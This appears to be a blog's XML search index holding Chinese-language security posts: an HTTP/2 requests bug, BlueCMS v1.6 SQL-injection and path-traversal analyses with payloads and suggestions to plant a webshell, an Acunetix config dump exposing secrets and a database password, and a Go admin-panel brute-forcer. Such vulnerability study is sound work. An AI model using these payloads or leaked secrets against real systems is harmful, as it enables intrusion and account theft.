<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Ape-requests不支持http2</title>
    <url>//28699.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>在APE(Auto-Pentest)的时候,借鉴了<code>w13scan</code>的大部分代码.<br>里面发包探测都用到了<code>requests</code>模块,时不时会出这种bug</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">raise ValueError(&#x27;Invalid header name %r&#x27; % (header,))</span><br><span class="line">ValueError: Invalid header name b&#x27;:authority&#x27;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Debug"><a href="#Debug" class="headerlink" title="Debug:"></a>Debug:</h1><p>请求了该url:<code>https://www.gstatic.com/proc/meminfo</code></p>
<p>输出该请求的headers后</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;:authority&#x27;</span>: <span class="string">&#x27;www.gstatic.com&#x27;</span>, <span class="string">&#x27;sec-fetch-site&#x27;</span>: <span class="string">&#x27;none&#x27;</span>, <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36&#x27;</span>, <span class="string">&#x27;accept-encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, br&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>发现header中有个参数多了个冒号.</p>
<hr>
<h1 id="原因"><a href="#原因" class="headerlink" title="原因:"></a>原因:</h1><p>goole了一下,参考了<a href="https://segmentfault.com/q/1010000007424047">http中的header为什么有这些部分？冒号的是什么</a></p>
<p>发现原来这些请求是用了<code>HTTP2</code>协议.而不是常见的<code>HTTP1.1</code></p>
<hr>
<h1 id="HTTP2的简单介绍"><a href="#HTTP2的简单介绍" class="headerlink" title="HTTP2的简单介绍:"></a>HTTP2的简单介绍:</h1><p>HTTP2 为什么要出现,又解决了HTTP1.1不能解决的什么事情呢？</p>
<p>简而言之就是</p>
<ul>
<li><strong>H2是一个二进制协议而,H1是超文本协议.传输的内容都不是一样的</strong></li>
<li>H2遵循多路复用即,代替同一host下的内容,只建立一次连接. H1不是</li>
<li>H2可以使用HPACK进行头部的压缩,H1则不论什么请求都会发送</li>
<li>H2允许服务器,预先将网页所需要的资源PUSH到浏览器的内存当中.</li>
</ul>
<hr>
<h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法:"></a>解决办法:</h1><h2 id="思路1"><a href="#思路1" class="headerlink" title="思路1:"></a>思路1:</h2><p>第一反应是看看<code>requests</code>支不支持HTTP2,发现是不支持的.<br><a href="https://stackoverflow.com/questions/44931070/does-python-requests-support-http2-and-asynchronous-calls">Does python-requests support HTTP2 and asynchronous calls?</a></p>
<p><img src="https://i.loli.net/2019/08/27/ClB43dsrNnPRQL7.jpg"></p>
<hr>
<h2 id="思路2"><a href="#思路2" class="headerlink" title="思路2:"></a>思路2:</h2><p>HTTP2应该还不是很普及,那就只能简单粗暴的暂时把<code>headers</code>中含冒号给替换成空字符.</p>
<blockquote>
<p>或许应该在日志里把这类请求给记录下来,随便看看HTTP2用得多不多</p>
</blockquote>
<hr>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://segmentfault.com/q/1010000007424047">http中的header为什么有这些部分？冒号的是什么</a></li>
<li><a href="https://stackoverflow.com/questions/44931070/does-python-requests-support-http2-and-asynchronous-calls">Does python-requests support HTTP2 and asynchronous calls?</a></li>
<li><a href="https://www.cnblogs.com/etoah/p/5891285.html">HTTP2特性预览和抓包分析</a></li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>BlueCMS-v1.6-sp1-admin-login.phpSQL注入漏洞分析</title>
    <url>//62100.html</url>
    <content><![CDATA[<h1 id="略读代码："><a href="#略读代码：" class="headerlink" title="略读代码："></a>略读代码：</h1><p>开头包含了文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require_once(dirname(__FILE__) . &#x27;/include/common.inc.php&#x27;);</span><br></pre></td></tr></table></figure>

<p>该文件中,<strong>全局数据转义</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!get_magic_quotes_gpc())//如果没有开启</span><br><span class="line">&#123;</span><br><span class="line">	$_POST = deep_addslashes($_POST);</span><br><span class="line">	$_GET = deep_addslashes($_GET);</span><br><span class="line">	$_COOKIES = deep_addslashes($_COOKIES);</span><br><span class="line">	$_REQUEST = deep_addslashes($_REQUEST);</span><br><span class="line">&#125; //加上斜杠转义</span><br></pre></td></tr></table></figure>

<p>输入了双引号，会被转义掉，那么此处就没办法简单地引入引号去控制Sql语句了。<br><img src="https://i.loli.net/2019/04/25/5cc1d6cc74921.jpg"></p>
<hr>
<h1 id="转换思路："><a href="#转换思路：" class="headerlink" title="转换思路："></a>转换思路：</h1><blockquote>
<p>这个时候发现自己没有思路了，只会单引号双引号。。。渣-c-</p>
</blockquote>
<p>参考一下：<a href="http://blog.0kami.cn/2017/01/11/old-bluecms-v1-6-Sql-Injection/">【Code Review】bluecms v1.6 Sql Injection 分析</a></p>
<p>可以发现对数据的注入，进行了<strong>加斜杠转义</strong>的操作。那么接下来找注入思路主要有以下3点：</p>
<ul>
<li>找<strong>整数型注入</strong></li>
<li>整套cms默认gb2312编码，容易造成<strong>宽字节注入</strong></li>
<li><img src="https://i.loli.net/2019/04/25/5cc1d6cd6f056.jpg">  </li>
<li><strong>http头</strong>并不在转义的范围内，所以类似存入ip，reffer的位置也能发生注入</li>
</ul>
<hr>
<h1 id="尝试宽字节注入："><a href="#尝试宽字节注入：" class="headerlink" title="尝试宽字节注入："></a>尝试宽字节注入：</h1><ul>
<li>抓包修改<code>admin_name=%df%27+or+1%3D1%23</code></li>
<li>明文就是<code>%df&#39; or 1=1#</code></li>
<li>单引号被转义后变成<code>%df\&#39; or 1=1#</code></li>
<li>宽字节注入是利用mysql的一个特性,因为gbk是多字节编码，他认为两个字节代表一个汉字，所以<code>%df</code>和后面的<code>\</code>也就是<code>%5c</code>变成了一个汉字“運”，而单引号逃逸了出来，就可以成功闭合sql语句了</li>
<li>再加上后面的<code>or 1=1 #</code>就构造成了永真语句，可以成功免密登录管理员后台了</li>
</ul>
<hr>
<h1 id="理解宽字节："><a href="#理解宽字节：" class="headerlink" title="理解宽字节："></a>理解宽字节：</h1><p>参考:<a href="http://www.freebuf.com/articles/web/31537.html">浅析白盒审计中的字符编码及SQL注入</a></p>
<ul>
<li><p>本质是如何绕过addslashes函数：</p>
</li>
<li><p>addslashes函数产生的效果就是，让<code>’</code>变成<code>\’</code>，让引号变得不再是“单引号”</p>
</li>
<li><p>一般绕过方式就是，想办法处理<code>\’</code>前面的<code>\</code></p>
</li>
<li><p>想办法给\前面再加一个\（或单数个即可），变成<code>\\’</code>，这样<code>\</code>被转义了，<code>’</code>逃出了限制</p>
</li>
<li><p>想办法把<code>\</code>弄没有。</p>
</li>
<li><p>mysql怎么判断一个字符是不是汉字?</p>
</li>
<li><p>根据gbk编码，第一个字节ascii码大于128，基本上就可以了。比如我们不用<code>%df</code>，用<code>%a1</code>也可以 </p>
</li>
<li><p>gb2312和gbk的区别？</p>
</li>
<li><p>gb2312编码的取值范围。它的高位范围是<code>0xA1~0xF7</code>，低位范围是<code>0xA1~0xFE</code>，而<code>\</code>是<code>0x5c</code>，是不在低位范围中的。</p>
</li>
<li><p><code>0x5c</code>根本不是gb2312中的编码，所以自然也是不会被吃掉的。</p>
</li>
</ul>
<p>修复方案1：</p>
<ul>
<li><p>先调用mysql_set_charset函数设置连接所使用的字符集为gbk</p>
</li>
<li><p>再调用mysql_real_escape_string来过滤用户输入。</p>
</li>
<li><p>这个方式是可行的，但有部分老的cms，在多处使用addslashes来过滤字符串，我们不可能去一个一个把addslashes都修改成mysql_real_escape_string。</p>
</li>
</ul>
<p>所以有修复方案2：</p>
<ul>
<li>将character_set_client设置为binary（二进制）。</li>
<li>只需在所有sql语句前指定一下连接的形式是二进制：<br><code>mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn); </code></li>
<li>所有数据以二进制的形式传递，就能有效避免宽字符注入。</li>
</ul>
<hr>
<h1 id="编写pocsuite插件："><a href="#编写pocsuite插件：" class="headerlink" title="编写pocsuite插件："></a>编写pocsuite插件：</h1><h2 id="requests不进行urldecode："><a href="#requests不进行urldecode：" class="headerlink" title="requests不进行urldecode："></a>requests不进行urldecode：</h2><p>参考：<a href="https://zhidao.baidu.com/question/1510942862655764300.html">如何在requests post时不做urlencode</a><br>There are many times that you want to send data that is not form-encoded. If you pass in a  string  instead of a  dict , that data will be posted directly.<br>所以，只要直接传一个string作为payload数据，requests就不会做任何转换，直接发出去。</p>
<p>并且加上<code>headers = &#123;&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&#125; </code></p>
<h2 id="验证："><a href="#验证：" class="headerlink" title="验证："></a>验证：</h2><p><img src="https://i.loli.net/2019/04/25/5cc1d6ceccdcc.jpg"></p>
<p><a href="https://github.com/jerrychan807/Pocsuite/blob/dev/modules/bluecms_v1_6_sp1_admin_sqli.py">poc链接</a></p>
<hr>
<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><ul>
<li>阅读源码的时候，先看看全局过滤</li>
<li>gb2312、gbk编码的话，考虑宽字节注入</li>
<li>宽字节注入的原理是 gbk是<strong>多字节编码</strong>，他认为两个字节代表一个汉字，所以可以用<code>%df</code>和后面的<code>\</code>也就是<code>%5c</code>变成了一个汉字“運”，而单引号逃逸了出来</li>
</ul>
<hr>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ul>
<li><a href="http://blog.0kami.cn/2017/01/11/old-bluecms-v1-6-Sql-Injection/">【Code Review】bluecms v1.6 Sql Injection 分析</a></li>
<li><a href="http://www.freebuf.com/articles/web/31537.html">浅析白盒审计中的字符编码及SQL注入</a></li>
</ul>
]]></content>
      <categories>
        <category>VulnAnalysis</category>
      </categories>
      <tags>
        <tag>VulnAnalysis</tag>
      </tags>
  </entry>
  <entry>
    <title>Awvs-linux版配置文件修改</title>
    <url>//42460.html</url>
    <content><![CDATA[<h1 id="pre"><a href="#pre" class="headerlink" title="pre:"></a>pre:</h1><p>linux版相较于wins版,默认配置有些许差异</p>
<table>
<thead>
<tr>
<th>version</th>
<th>api-port</th>
<th>db-port</th>
</tr>
</thead>
<tbody><tr>
<td>wins</td>
<td>3443</td>
<td>35432</td>
</tr>
<tr>
<td>linux</td>
<td>13443</td>
<td>45432</td>
</tr>
</tbody></table>
<p>现在要把linux的修改成wins的一样。。。</p>
<hr>
<h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件:"></a>配置文件:</h1><h2 id="wvs-ini："><a href="#wvs-ini：" class="headerlink" title="wvs.ini："></a>wvs.ini：</h2><p>配置文件</p>
<p>路径:<code>/home/acunetix/.acunetix_trial/wvs.ini</code></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attr">logging.file.file_name</span>=~/.acunetix_trial/logs/backend.log</span><br><span class="line"><span class="attr">base_storage</span>=~/.acunetix_trial/data</span><br><span class="line"><span class="attr">logging.file.level</span>=INFO</span><br><span class="line"><span class="attr">server.address</span>=<span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="number">3443</span> <span class="comment"># !!!edit</span></span><br><span class="line"><span class="attr">server.host</span>=debian</span><br><span class="line"><span class="attr">server.frontend.session_secret</span>=<span class="number">6</span>rRI3RtEOQbZJLXdQBIZdhKzL8q4D2YS</span><br><span class="line"><span class="attr">wvs.temp_dir</span>=~/.acunetix_trial/data/temp</span><br><span class="line"><span class="attr">target_secret_salt</span>=<span class="number">1</span>e79Bc99vW2r4H51chSULiA5WCXXPCGQ</span><br><span class="line"><span class="attr">uploads_salt</span>=mX75i7UNuXVKStEjM2ihLQy4SByclCkB</span><br><span class="line"><span class="attr">server.ssl.certificate</span>=~/.acunetix_trial/data/certs/server.cer</span><br><span class="line"><span class="attr">server.ssl.private_key</span>=~/.acunetix_trial/data/certs/server.key</span><br><span class="line"><span class="attr">databases.connections.master.connection.user</span>=acunetix</span><br><span class="line"><span class="attr">databases.connections.master.connection.host</span>=<span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">databases.connections.master.connection.port</span>=<span class="number">35432</span> <span class="comment"># !!!edit</span></span><br><span class="line"><span class="attr">databases.connections.master.connection.db</span>=wvs</span><br><span class="line"><span class="attr">databases.connections.master.connection.password</span>=j3ASXBKVp7f9lZDii9JwJKyKOUjI2ezy</span><br><span class="line"><span class="attr">server.static_document_root</span>=~/.acunetix_trial/v_190325161/ui</span><br><span class="line"><span class="attr">wvs.app_dir</span>=~/.acunetix_trial/v_190325161/scanner</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h2><p>启动脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">version=v_190325161</span><br><span class="line">db_port=35432  <span class="comment"># !!!edit</span></span><br><span class="line">product_name=acunetix_trial</span><br><span class="line">engine_only=0</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$engine_only</span> != 1 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;attempting to stop previous database&quot;</span></span><br><span class="line">    ~/.<span class="variable">$product_name</span>/<span class="variable">$version</span>/database/bin/pg_ctl -D ~/.<span class="variable">$product_name</span>/db -w stop</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;attempting to start the db&quot;</span></span><br><span class="line">    setsid ~/.<span class="variable">$product_name</span>/<span class="variable">$version</span>/database/bin/pg_ctl -D ~/.<span class="variable">$product_name</span>/db -o <span class="string">&quot;--port=<span class="variable">$db_port</span>&quot;</span> -w start</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;attempting to start the backend&quot;</span></span><br><span class="line"><span class="comment">#~/.$product_name/$version/venv/bin/python3 ~/.$product_name/$version/backend/wvs.py --conf ~/.$product_name/wvs.ini</span></span><br><span class="line"><span class="built_in">cd</span> ~/.<span class="variable">$product_name</span>/<span class="variable">$version</span>/backend/</span><br><span class="line">~/.<span class="variable">$product_name</span>/<span class="variable">$version</span>/backend/opsrv --conf ~/.<span class="variable">$product_name</span>/wvs.ini</span><br><span class="line"></span><br><span class="line">backend_exit_code=$?</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;backend exited with&quot;</span> <span class="variable">$backend_exit_code</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$engine_only</span> != 1 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;attempting to stop the database&quot;</span></span><br><span class="line">    ~/.<span class="variable">$product_name</span>/<span class="variable">$version</span>/database/bin/pg_ctl -D ~/.<span class="variable">$product_name</span>/db -w stop</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bye.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> <span class="variable">$backend_exit_code</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<hr>
<h1 id="数据库文件"><a href="#数据库文件" class="headerlink" title="数据库文件:"></a>数据库文件:</h1><h2 id="pg-hba-conf"><a href="#pg-hba-conf" class="headerlink" title="pg_hba.conf:"></a>pg_hba.conf:</h2><p>路径: <code>/home/acunetix/.acunetix_trial/db/pg_hba.conf</code></p>
<p><img src="https://i.loli.net/2019/06/17/5d07572f4704659796.png"></p>
<p>跟原来的wins有些许差异.</p>
<table>
<thead>
<tr>
<th>version</th>
<th>method</th>
</tr>
</thead>
<tbody><tr>
<td>wins</td>
<td>trust</td>
</tr>
<tr>
<td>linux</td>
<td>md5</td>
</tr>
</tbody></table>
<p>按上面的提示所说,<code>wins</code>的是用了<code>trust</code>是明文,linux是用加密的密码去连接.后面实际连接数据库要用.</p>
<hr>
<h2 id="postgresql-conf"><a href="#postgresql-conf" class="headerlink" title="postgresql.conf"></a>postgresql.conf</h2><p>路径: <code>/home/acunetix/.acunetix_trial/db/postgresql.conf</code></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">listen_addresses</span> = <span class="string">&#x27;*&#x27;</span> <span class="comment"># !!!edit</span></span><br><span class="line"><span class="attr">port</span> = <span class="number">45432</span></span><br><span class="line"><span class="attr">max_connections</span> = <span class="number">100</span></span><br><span class="line"><span class="attr">ssl</span> = <span class="literal">off</span></span><br><span class="line"><span class="attr">shared_buffers</span> = <span class="number">128</span>MB</span><br><span class="line"><span class="attr">huge_pages</span> = try</span><br><span class="line"><span class="attr">event_source</span> = <span class="string">&#x27;Acunetix Trial Database&#x27;</span></span><br><span class="line"><span class="attr">client_min_messages</span> = notice</span><br><span class="line"><span class="attr">log_min_messages</span> = fatal</span><br><span class="line"><span class="attr">log_min_error_statement</span> = fatal</span><br></pre></td></tr></table></figure>

<hr>
<p>然后就可以连接了。。。</p>
<p><img src="https://i.loli.net/2019/06/18/5d085b3be432277542.png"></p>
<p>密码在<code>wvs.ini</code>里。</p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><p><a href="https://www.acunetix.com/blog/category/docs/">acunetix docs</a></p>
<p>没事看看文档或者他家的博客,学习点扫描器思路再拿来自己写扫描器也是不错滴.</p>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>BlueCMS-v1.6-sp1-admin-tpl_manage.php-本地文件包含漏洞分析</title>
    <url>//59330.html</url>
    <content><![CDATA[<h1 id="熟悉功能："><a href="#熟悉功能：" class="headerlink" title="熟悉功能："></a>熟悉功能：</h1><p><img src="https://i.loli.net/2019/04/25/5cc1d6d684584.jpg"></p>
<p>方便管理员对模板html文件进行修改</p>
<hr>
<h1 id="用户可控变量："><a href="#用户可控变量：" class="headerlink" title="用户可控变量："></a>用户可控变量：</h1><ul>
<li><code>$_REQUEST</code></li>
<li><code>$_REQUEST[&#39;act&#39;]</code></li>
<li><code>$_GET</code></li>
<li><code>$_GET[&#39;tpl_name&#39;]</code></li>
<li><code>$_POST</code></li>
<li><code>$_POST[&#39;tpl_name&#39;]</code></li>
<li><code>$_POST[&#39;tpl_content&#39;]</code></li>
</ul>
<p><code>$_REQUEST[&#39;act&#39;]</code>无法影响判断</p>
<h2 id="GET-‘tpl-name’"><a href="#GET-‘tpl-name’" class="headerlink" title="$_GET[‘tpl_name’]"></a>$_GET[‘tpl_name’]</h2><p>$_GET[‘tpl_name’]为你想要编辑的模板文件名字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">elseif($act == &#x27;edit&#x27;)&#123;</span><br><span class="line">$file = $_GET[&#x27;tpl_name&#x27;];</span><br><span class="line">if(!$handle = @fopen(BLUE_ROOT.&#x27;templates/default/&#x27;.$file, &#x27;rb&#x27;))&#123; # $file直接拼接</span><br><span class="line">	showmsg(&#x27;打开目标模板文件失败&#x27;); # 判断文件是否存在</span><br><span class="line">&#125;</span><br><span class="line">$tpl[&#x27;content&#x27;] = fread($handle, filesize(BLUE_ROOT.&#x27;templates/default/&#x27;.$file)); # 读取文件</span><br><span class="line">$tpl[&#x27;content&#x27;] = htmlentities($tpl[&#x27;content&#x27;], ENT_QUOTES, GB2312);</span><br><span class="line">fclose($handle);</span><br><span class="line">$tpl[&#x27;name&#x27;] = $file;</span><br><span class="line">template_assign(array(&#x27;current_act&#x27;, &#x27;tpl&#x27;), array(&#x27;编辑模板&#x27;, $tpl));</span><br><span class="line">$smarty-&gt;display(&#x27;tpl_info.htm&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>没有对<code>$_GET[&#39;tpl_name&#39;]</code>进行过滤，加上<code>../</code>可以读取web目录以外的内容。<br>payload &#x3D; <code>http://bluecmsv16:9990/admin/tpl_manage.php?act=edit&amp;tpl_name=../../../upgrade/upgrade.php</code></p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6d79cd11.jpg"></p>
<p>有什么比较有价值的网站文件吗?</p>
<p>可以php文件即读到网站源码</p>
<h2 id="POST变量"><a href="#POST变量" class="headerlink" title="$_POST变量"></a>$_POST变量</h2><p><code>$_POST[&#39;tpl_name&#39;]</code>变量:你想要更改的网站模板文件<br><code>$_POST[&#39;tpl_content&#39;]</code>变量:你要更改的内容</p>
<p>两个变量均没有经过过滤，可以直接修改网站的源码<br><img src="https://i.loli.net/2019/04/25/5cc1d6d8cdcd1.jpg"></p>
<hr>
<h1 id="编写pocsuite插件："><a href="#编写pocsuite插件：" class="headerlink" title="编写pocsuite插件："></a>编写pocsuite插件：</h1><p>发现需要root登录状态才行,可以通过之前的登录绕过获取到cookie</p>
<p>手工添加cookie尝试，该漏洞确实是要登录状态才能利用</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6da16fc6.jpg"></p>
<p>要配合<code>BlueCMS v1.6 sp1 /admin/login.php SQL注入漏洞</code>一起使用</p>
<p>怎么攻击呢？</p>
<p>可以修改网站下的任何源代码，可以</p>
<ul>
<li>写入一句话木马</li>
<li>盗号js</li>
</ul>
<p>写入一句话木马</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6db66142.jpg"><br><img src="https://i.loli.net/2019/04/25/5cc1d6dd2c21f.jpg"></p>
<hr>
<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><ul>
<li>有时候多个漏洞组合起来，可以达到一个很好的效果。</li>
<li>要写验证和攻击的代码才能更了解漏洞的原理</li>
</ul>
]]></content>
      <categories>
        <category>VulnAnalysis</category>
      </categories>
      <tags>
        <tag>VulnAnalysis</tag>
      </tags>
  </entry>
  <entry>
    <title>Breacher-Go高并发管理员后台爆破工具</title>
    <url>//7273.html</url>
    <content><![CDATA[<h1 id="preface"><a href="#preface" class="headerlink" title="preface :"></a>preface :</h1><p><a href="https://github.com/s0md3v/Breacher">Breacher</a>是由python写的多线程管理员后台爆破工具</p>
<p>出于练手的目的,打算用golang重新造个轮子.</p>
<p>github:<a href="https://github.com/jerrychan807/Breacher-Go">Breacher-Go</a></p>
<h1 id="并发"><a href="#并发" class="headerlink" title="并发:"></a>并发:</h1><p>python里面自然用得多的是多线程.<br>而go里面自然要用到<code>goroutine</code></p>
<h1 id="go-goroutine"><a href="#go-goroutine" class="headerlink" title="go goroutine"></a>go goroutine</h1><h2 id="语法"><a href="#语法" class="headerlink" title="语法:"></a>语法:</h2><p>在Go语言中，<strong>每一个并发的执行单元叫作一个<code>goroutine</code></strong></p>
<p>当一个程序启动时，其主函数即在一个单独的<code>goroutine</code>中运行，我们叫它<code>main goroutine</code>。</p>
<p>新的<code>goroutine</code>会用<code>go</code>语句来创建。</p>
<p>在语法上，go语句是一个普通的函数或方法调用前加上**关键字<code>go</code>**。</p>
<p>go语句会使其语句中的函数在一个新创建的<code>goroutine</code>中运行。而go语句本身会迅速地完成。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">f()    <span class="comment">// call f(); wait for it to return</span></span><br><span class="line"><span class="keyword">go</span> f() <span class="comment">// create a new goroutine that calls f(); don&#x27;t wait</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>在Go语言中，语言本身就已经实现和支持了并发,所以写起并发来相当方便.</p>
</blockquote>
<h2 id="goroutine的优势"><a href="#goroutine的优势" class="headerlink" title="goroutine的优势:"></a>goroutine的优势:</h2><p>gouroutine其实就是一种协程，类似其他语言中的coroutine， 是在编译器或虚拟机层面上的多任务。</p>
<p>它可以运行在一个或多个线程上，但不同于线程，它是<strong>非抢占式</strong>的，所以协程很轻量。</p>
<h1 id="简单的并发方案1"><a href="#简单的并发方案1" class="headerlink" title="简单的并发方案1"></a>简单的并发方案1</h1><p>简单的做法:</p>
<ul>
<li>将需要处理的Url分成n等份</li>
<li>开启n个goroutine去消费掉url</li>
</ul>
<ol>
<li>将需要处理的Url分成n等份</li>
</ol>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">divided</span><span class="params">(links []<span class="type">string</span>, goroutineNum <span class="type">int</span>)</span></span> [][]<span class="type">string</span> &#123;</span><br><span class="line">	chunkSize := (<span class="built_in">len</span>(links) + goroutineNum - <span class="number">1</span>) / goroutineNum</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> dividedPath [][]<span class="type">string</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(links); i += chunkSize &#123;</span><br><span class="line">		end := i + chunkSize</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> end &gt; <span class="built_in">len</span>(links) &#123;</span><br><span class="line">			end = <span class="built_in">len</span>(links)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		dividedPath = <span class="built_in">append</span>(dividedPath, links[i:end])</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> dividedPath</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.开启n个goroutine去消费掉url</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line">dividedLinks := divided(collected_path, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"><span class="keyword">for</span> _, link := <span class="keyword">range</span> dividedLinks &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%#v\n&quot;</span>, <span class="built_in">len</span>(link))</span><br><span class="line">	wg.Add(<span class="number">1</span>) <span class="comment">// Increment the WaitGroup counter.</span></span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(link []<span class="type">string</span>)</span></span> &#123;</span><br><span class="line">		<span class="comment">// Launch a goroutine to fetch the link.</span></span><br><span class="line">		scan(start_url, link)</span><br><span class="line">		<span class="comment">// Fetch the link.</span></span><br><span class="line">		wg.Done()</span><br><span class="line">	&#125;(link)</span><br><span class="line">&#125;</span><br><span class="line">wg.Wait() <span class="comment">// Wait for all goroutines to finish.</span></span><br></pre></td></tr></table></figure>

<h1 id="速度比较"><a href="#速度比较" class="headerlink" title="速度比较:"></a>速度比较:</h1><h2 id="自身速度比较"><a href="#自身速度比较" class="headerlink" title="自身速度比较:"></a>自身速度比较:</h2><p>go 不用并发消耗的时间:</p>
<p>不同网络环境下的消耗时间:</p>
<ol>
<li><p><code>elapsed time:  1.951978378s</code> (5个goroutine)</p>
</li>
<li><p><code>elapsed time:  11.353934431s</code></p>
</li>
<li><p><code>elapsed time:  35.50535812s</code> (5个goroutine)</p>
</li>
<li><p><code>elapsed time:  2m32.608078161s</code></p>
</li>
</ol>
<h2 id="与python的速度比较"><a href="#与python的速度比较" class="headerlink" title="与python的速度比较:"></a>与python的速度比较:</h2><p>python:<br>2个线程:<code>74.5581650734s</code></p>
<p>go:<br>2个goroutine<br><code>elapsed time:  1m10.233281137s</code></p>
<p>速度几乎是一样的,并非是想象中那样,go会比python快很多.</p>
<blockquote>
<p>question: 什么场景下goroutine会比python的thread有优势?</p>
</blockquote>
<hr>
<h1 id="减少误报"><a href="#减少误报" class="headerlink" title="减少误报:"></a>减少误报:</h1><h2 id="最快的方式"><a href="#最快的方式" class="headerlink" title="最快的方式:"></a>最快的方式:</h2><p>最快的方式就是用<code>head</code>请求,然后通过<code>response code</code>判断,如果是<code>200</code>则认为存在.</p>
<p>但是这样在实际应用过程中,很有可能会产生大量的误报.</p>
<blockquote>
<p>使用御剑爆破网站路径的时候,同理也会产生大量的误报.</p>
</blockquote>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子:"></a>例子:</h2><p>Response code是200</p>
<p>大量误报:<br><img src="https://i.loli.net/2019/04/25/5cc1d6df955e8.jpg"></p>
<p>误报结果:<br><img src="https://i.loli.net/2019/04/25/5cc1d6e0776ac.jpg"></p>
<h2 id="原因"><a href="#原因" class="headerlink" title="原因:"></a>原因:</h2><p>暂时能想到的原因有:</p>
<ul>
<li>网站本身会自定义错误或者404页面</li>
<li>网站有防护设备,会自动重定向到别的页面</li>
</ul>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案:"></a>解决方案:</h2><p>找到管理员的后台的目的,通常是为了暴力破解,尝试用弱密码进入到管理员的后台.</p>
<p>那么就是有个共同点就是有登录页面</p>
<p>密码框常用到是<code>input</code>标签的 type属性设为<code>password</code><br><img src="https://i.loli.net/2019/04/25/5cc1d6e141448.jpg"></p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d6e1e2da6.jpg"></p>
<p>解决方案：</p>
<ul>
<li>用<code>get</code>方法获取登录页面源码</li>
<li>Response code 为200的同时,页面源码含有<code>type=&quot;password&quot;</code></li>
</ul>
<p>结果确实是大大减少了误报</p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1g0j41hdln4j30ou0pewte.jpg"></p>
<blockquote>
<ol>
<li>大字典的情况下,<code>get</code>方法的速度肯定会比<code>head</code>方法慢很多,哎,速度与准确性常常难以并存啊~</li>
